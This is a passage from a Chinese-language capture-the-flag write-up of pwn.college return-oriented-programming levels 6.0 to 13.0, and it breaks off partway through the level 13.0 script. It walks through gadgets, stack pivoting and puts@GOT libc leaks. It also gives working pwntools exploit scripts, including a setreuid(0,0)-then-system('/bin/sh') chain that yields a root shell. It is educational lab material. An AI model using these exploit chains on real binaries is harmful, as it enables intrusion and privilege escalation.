<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">force_import</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">off_t</span> *v2; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rcx</span><br><br>  open(a1, a2);<br>  <span class="hljs-keyword">return</span> sendfile((<span class="hljs-type">int</span>)a1, a2, v2, v3);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>sendfile这个可太熟了，第一个shellcode就是sendfile。直接调用这个函数就行了。查看gadget：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x00000000004014d2</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbx</span> <span class="hljs-comment">; pop r12 ; pop r13 ; pop rbp ; ret</span><br><span class="hljs-number">0x00000000004023d4</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rcx</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000004023cc</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000004023dc</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdx</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x0000000000402621</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span> <span class="hljs-comment">; pop r15 ; ret</span><br><span class="hljs-number">0x00000000004023c4</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span> <span class="hljs-comment">; ret</span><br></code></pre></td></tr></table></figure>

<p>force_import的地址：<code>0x402399</code>。这里复习一下<code>x86-64</code>架构的<code>System V AMD64 ABI</code>调用约定下，<strong>整数和指针</strong>参数传递规则</p>
<table>
<thead>
<tr>
<th>参数顺序</th>
<th>寄存器</th>
</tr>
</thead>
<tbody><tr>
<td>第1个</td>
<td><code>rdi</code></td>
</tr>
<tr>
<td>第2个</td>
<td><code>rsi</code></td>
</tr>
<tr>
<td>第3个</td>
<td><code>rdx</code></td>
</tr>
<tr>
<td>第4个</td>
<td><code>rcx</code></td>
</tr>
<tr>
<td>第5个</td>
<td><code>r8</code></td>
</tr>
<tr>
<td>第6个</td>
<td><code>r9</code></td>
</tr>
<tr>
<td>第7个及以后</td>
<td>栈</td>
</tr>
</tbody></table>
<p>当掌握了返回地址时，可以跳跃到任何地方。包括一个函数的中间某条指令处。只要某个段有可执行权限，那么就可以将返回地址设置为它，并执行其中的代码。这里用到了<code>.plt.sec</code>段的read函数。然后使其接收用户输入来将”&#x2F;flag”字符串写入一个可写段。再调用force_import。</p>
<p>这里需要调用两次force_import，且第一次应该是函数的起始地址，因为我们需要正常返回，需要主要函数调用时栈的迁移。如果我们设置的ret地址是调用open时的地址，那么在执行完sendfile后，无法正常返回。因为返回地址没有push进栈，导致返回不了。第二次时，可以不执行open，执行open的话会导致我们设置的ROP失效，因为open函数调用后会导致一些寄存器的值被修改，导致sendfile失败。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level6.0&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span><br><span class="hljs-comment"># p.recvuntil(b&#x27;[LEAK] Your input buffer is located at: &#x27;)</span><br><span class="hljs-comment"># buf_addr = p.recv(14)</span><br><span class="hljs-comment"># print(&quot;buf_addr:&quot;, buf_addr)</span><br><span class="hljs-comment"># buf_addr = p64(int(buf_addr.decode(&#x27;utf-8&#x27;)[2:], 16))</span><br>buf_addr = p64(<span class="hljs-number">0x405000</span>)<br>pop_rdi = p64(<span class="hljs-number">0x00000000004023cc</span>)<br>pop_rsi = p64(<span class="hljs-number">0x00000000004023c4</span>)<br>pop_rax = p64(<span class="hljs-number">0x0000000000401bc7</span>)<br>pop_rcx = p64(<span class="hljs-number">0x00000000004023d4</span>)<br><span class="hljs-comment"># syscall = p64(0x0000000000401bdf)</span><br>pop_rdx = p64(<span class="hljs-number">0x00000000004023dc</span>)<br><span class="hljs-comment"># open_sys = pop_rdi + buf_addr + pop_rsi + p64(0x0) + pop_rax + p64(0x2) + syscall</span><br><span class="hljs-comment"># read_sys = pop_rax + p64(0x0) + pop_rdi + p64(0x3) + pop_rsi + buf_addr + pop_rdx + p64(1024) + syscall</span><br><span class="hljs-comment"># write_sys = pop_rdx + p64(0x39) + pop_rax + p64(1) + pop_rdi + p64(1) + pop_rsi + buf_addr + syscall</span><br><span class="hljs-comment"># read_stdin = pop_rax + p64(0x0) + pop_rdi + p64(0) + pop_rsi + buf_addr + pop_rdx + p64(0x6) + syscall</span><br>read_stdin = pop_rdi + p64(<span class="hljs-number">0x0</span>) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">0x6</span>) + p64(<span class="hljs-number">0x401160</span>)<br>force_import_open = pop_rdi + buf_addr + pop_rsi + p64(<span class="hljs-number">0x0</span>) + pop_rdx + p64(<span class="hljs-number">0x0</span>) + pop_rcx + p64(<span class="hljs-number">0x39</span>) + p64(<span class="hljs-number">0x402399</span>)<br>force_import_send = pop_rdi + p64(<span class="hljs-number">0x1</span>) + pop_rsi + p64(<span class="hljs-number">0x3</span>) + pop_rdx + p64(<span class="hljs-number">0x0</span>) + pop_rcx + p64(<span class="hljs-number">0x39</span>) + p64(<span class="hljs-number">0x4023ab</span>)<br>payload = padding + read_stdin + force_import_open + force_import_send<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span> + p8(<span class="hljs-number">0x00</span>))<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure>

<h4 id="level6-1-1"><a href="#level6-1-1" class="headerlink" title="level6.1"></a>level6.1</h4><p>这道题就是上面的exp改地址就行了。</p>
<h4 id="level7-0-1"><a href="#level7-0-1" class="headerlink" title="level7.0"></a>level7.0</h4><p>这里有一个坑啊，就是直接使用<code>system(&quot;/bin/sh&quot;)</code>，拿到shell后，还是”hacker”的身份，依然没有权限拿到flag。需要做一个进程uid的修改。</p>
<blockquote>
<p>UID（用户标识符）</p>
<p>UID是用于标识系统中每个用户的唯一数字。每个用户都有一个UID，系统通过UID来识别用户并控制其权限。普通用户的UID从1000开始，具体取决于系统的配置。ROOT用户的UID始终为0。</p>
<p>Real UID和 Effective UID</p>
<p>真实用户ID是启动进程的用户的UID。它代表了进程的真正所有者。</p>
<p>有效用户ID决定了进程在执行操作时的权限级别。有些时候进程需要特权时便会切换EUID以执行相应操作。</p>
<p>但是，RUID为普通用户，启动的shell也是普通用户。【也有例外】如果可执行文件设置了Set UID位，并且其所有者是Root，那么无论谁允许该程序，进程的有效用户ID都会是Root。</p>
<p><code>setreuid</code>是一个系统调用，用户改变进程的真实用户ID和有效用户ID。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setreuid</span><span class="hljs-params">(<span class="hljs-type">uid_t</span> ruid, <span class="hljs-type">uid_t</span> euid)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">ruid: 要设置的真实用户ID。如果传入-1，则表示不改变当前的ruid。0表示root</span><br><span class="hljs-comment">euid: 要设置的有效用户ID。如果传入-1，则表示不改变当前的euid。0表示root</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></blockquote>
<p>这一个level我尝试了chmod，但是发现不行。chmod+ln -s的方式。修改&#x2F;flag的软链接文件的权限，但是是失败的，我在Practice模式里尝试也是失败的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level7.0&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.recvuntil(<span class="hljs-string">b&quot;[LEAK] The address of \&quot;system\&quot; in libc is: &quot;</span>)<br>sys_addr = p.recv(<span class="hljs-number">14</span>)<br>sys_addr = <span class="hljs-built_in">int</span>(sys_addr.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sys_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(sys_addr))<br>libc.address = sys_addr - libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump)<br><br>payload = padding + rop.chain()<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br><span class="hljs-comment"># print(p.recvall())</span><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h4 id="level7-1-1"><a href="#level7-1-1" class="headerlink" title="level7.1"></a>level7.1</h4><p>只改padding即可。</p>
<h4 id="level8-0-1"><a href="#level8-0-1" class="headerlink" title="level8.0"></a>level8.0</h4><p>看了一下课才知道怎么做。思路是：由于延迟绑定的原因，只有先执行一遍libc中的函数，libc.so才会被加载进内存，此时我们获得的libc的基址就是内存中实际libc的地址。因此，可以采用<code>puts(puts)</code>的形式，像题目中提示的那样。</p>
<p>首先执行一次<code>plt.put(got.puts)</code>，这样能够把got表中puts的值打印出来。然后再用puts的got表地址减去puts在libc中的偏移地址得到libc的基地址。此时，我们再返回challenge函数重新执行一遍challenge。第二次challenge的执行是为了获得shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level8.0&quot;</span>)<br><span class="hljs-comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x78</span><br>challenge_addr = p64(<span class="hljs-number">0x402000</span>)  <span class="hljs-comment"># 这里可以直接换成read指令所在的地址，因为我们没有修改rbp</span><br>e = p.elf<br>r = ROP(e)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(challenge_addr)<br>payload = padding + r.chain()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;Leaving!\n&#x27;</span>)<br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_got_addr))<br>libc.address = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><br><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br>payload = padding + rop.chain()<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h4 id="level8-1-1"><a href="#level8-1-1" class="headerlink" title="level8.1"></a>level8.1</h4><p>改一下padding以及challenge的地址就行</p>
<h4 id="level9-0-2"><a href="#level9-0-2" class="headerlink" title="level9.0"></a>level9.0</h4><p>有点小麻，由于长时间尝试返回地址为challenge，导致栈迁移后大概率会出现问题。因为进入challenge时会创建新的函数栈帧，而这个栈帧会导致后面的printf函数出现空指针的错误，因此，我一直在尝试解决这个问题，修复栈修复到我要原地爆炸！最后还是妥协，返回地址设置成read函数那儿，从而一下就能出来，因为栈没有变，迁移后的栈是我们可控的。</p>
<p>buf_addr: <code>0x4150e0</code>，需要用leave指令把栈迁移到bss段的可写段。我开辟了一个rsp-&gt;<code>0x4150f8</code>然后rbp-&gt;<code>0x415140</code>这么样的一个新栈帧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level9.0&quot;</span>)<br><span class="hljs-comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><span class="hljs-comment"># padding = b&#x27;a&#x27;*0x48</span><br>read_addr = p64(<span class="hljs-number">0x402257</span>)  <br>e = p.elf<br>r = ROP(e)<br><span class="hljs-comment"># buf_addr = 0x415100</span><br>r.raw(r.rbp)<br>r.raw(<span class="hljs-number">0x4150f8</span>)<br>r.raw(r.leave)<br>r.raw(<span class="hljs-number">0x415140</span>)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(read_addr)<br>payload = r.chain()<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;Leaving!\n&#x27;</span>)<br><span class="hljs-comment"># printf_got_addr = p.recv(6)</span><br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_got_addr))<br>libc.address = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><br><span class="hljs-comment"># p.send(payload)</span><br><span class="hljs-comment"># libc.address = sys_addr - libc.symbols[&#x27;system&#x27;]</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">56</span><br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + rop.chain()<br>pause()<br>p.send(payload)<br><br><span class="hljs-comment"># print(p.recvall())</span><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h4 id="level9-1-2"><a href="#level9-1-2" class="headerlink" title="level9.1"></a>level9.1</h4><p>只用改buf的地址以及read的地址即可。</p>
<h4 id="level10-0-2"><a href="#level10-0-2" class="headerlink" title="level10.0"></a>level10.0</h4><p>这题依然是栈迁移，需要细细分析。leave指令的作用。并且需要查看win函数地址存放在栈的哪里。</p>
<blockquote>
<p><code>leave = mov rbp, rsp; pop rbp;</code></p>
</blockquote>
<p>基于leave指令的特性，可以覆盖rbp的值，使其在栈中迁移。因为challenge函数在ret前会有一次leave。所以可以迁移rbp指令至win函数地址-8的位置。为什么要减去8？分析stack(win) - 8（这表示win函数地址的栈地址并减去8）的情形：</p>
<p>当修改rbp地址的存储为stack(win)-8后，正常执行结束challenge函数，那么会执行一次leave指令。先执行<code>mov rsp, rbp</code>后：rsp此时指向stack(win)-8，再执行&#96;&#96;pop rbp&#96;后，rbp此时的地址为stack(win)-8，此时rsp指向原先rbp的地址+8，即返回地址处。</p>
<p>那么再执行一次leave后，还会执行<code>mov rsp, rbp</code>，此时rsp的地址为stack(win)-8。此时再执行<code>pop rbp</code>后，rbp可能已经丢失了，然后rsp为stack(win)。那么此时再执行一个ret指令，即跳转到win函数了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&quot;/challenge/babyrop_level10.0&quot;</span>)<br>    padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: &#x27;</span>)<br>    input_buf = p64(<span class="hljs-built_in">int</span>(p.recvline().strip()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">8</span> - <span class="hljs-number">8</span>)<br><br>    payload = padding + input_buf + p16(<span class="hljs-number">0xe71e</span>)<br>    <span class="hljs-comment"># pause()</span><br>    p.send(payload)<br>    out = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(out)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>当然，因为题目给了win函数的地址，因此可以直接ret到那儿去。但是10.1还是要按照这种方法做的。</p>
<h4 id="level10-1-2"><a href="#level10-1-2" class="headerlink" title="level10.1"></a>level10.1</h4><p>该padding以及gadget偏移即可。</p>
<h4 id="level11-0-2"><a href="#level11-0-2" class="headerlink" title="level11.0"></a>level11.0</h4><p>如level10.1脚本，改gadget偏移</p>
<h4 id="level11-1-2"><a href="#level11-1-2" class="headerlink" title="level11.1"></a>level11.1</h4><p>还是改gadget偏移即可</p>
<h4 id="level12-0-2"><a href="#level12-0-2" class="headerlink" title="level12.0"></a>level12.0</h4><p>这题没有challenge函数了。因此，我们爆破的是main函数的返回地址。它会去到libc.so文件中。所以我们需要拿到libc.so文件中的<code>leave;ret</code>指令的偏移地址。然后爆破。这里爆破的时间就有点长了，因为偏移地址是3个字节的长度。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">from</span> pwn import *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-keyword">while</span> True:<br>    p = process(<span class="hljs-string">&quot;/challenge/babyrop_level12.1&quot;</span>)<br>    padding = b<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span><br>    p.recvuntil(b<span class="hljs-string">&#x27;located at: &#x27;</span>)<br>    input_buf = p64(<span class="hljs-built_in">int</span>(p.recvline().strip()[:<span class="hljs-number">-1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">8</span> - <span class="hljs-number">8</span>)<br>    payload = padding + input_buf + p16(<span class="hljs-number">0x18c8</span>) + p8(<span class="hljs-number">0x73</span>)<br>    <span class="hljs-meta"># pause()</span><br>    p.send(payload)<br>    <span class="hljs-keyword">out</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">out</span>:<br>        <span class="hljs-function"><span class="hljs-keyword">break</span></span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-params"><span class="hljs-keyword">out</span></span>)</span><br><span class="hljs-function">p.<span class="hljs-title">interactive</span>()</span><br></code></pre></td></tr></table></figure>

<p>记得<code>p.recvall(1)</code>，设置一下超时时间，因为爆破过程中很有可能会去到libc.so中某个有效地址，从而导致程序hang out，那么你就得重新开始跑。这样的话，重复执行exp多次也不一定能够爆破出来。</p>
<h4 id="level12-1-2"><a href="#level12-1-2" class="headerlink" title="level12.1"></a>level12.1</h4><p>上面的exp直接跑</p>
<h4 id="level13-0-2"><a href="#level13-0-2" class="headerlink" title="level13.0"></a>level13.0</h4><p>这题所有保护都开了，但是题目给了LEAK，让我们泄露canary。泄露出来后，需要覆盖最低的一个字节，让它返回到<code>call main</code>的前面，然后重新执行一遍main，此时再泄露ret地址，因为ret地址减去固定偏移就是<code>libc_base</code>的地址，这样就可以进行ROP了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># 